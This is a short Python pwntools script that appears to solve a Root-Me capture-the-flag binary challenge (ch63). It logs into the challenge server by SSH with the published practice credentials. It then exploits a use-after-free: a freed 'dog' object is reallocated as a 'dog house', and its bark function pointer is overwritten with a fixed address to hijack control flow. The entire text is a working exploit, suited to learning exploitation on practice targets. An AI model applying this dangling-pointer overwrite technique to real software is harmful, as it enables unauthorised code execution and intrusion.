from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
# context.aslr = True

s = ssh(host='challenge03.root-me.org',user='app-systeme-ch63',password='app-systeme-ch63',port=2223)

#p = process("./63")
#gdb.attach(p,"break *main+426")

flag = 0x565912ce
real_flag = 0x080487cb

payload = "A" * 12 + p32(real_flag)
i=0

p = s.process('/challenge/app-systeme/ch63/./ch63')
p.sendline("1")     # Buy dog
p.sendline("1111")  # Name it
p.sendline("4")     # Delete = Dangling Pointer
p.sendline("5")     # Build Dog House @ Dangling Pointer (struct dog)
p.sendline(payload) # Address = fill name[12] with 12 bytes then ovewrite void (*bark)();
p.sendline("3333")  # Name of Dog House
p.sendline("2")     # Call Bark = BBBB
p.interactive()

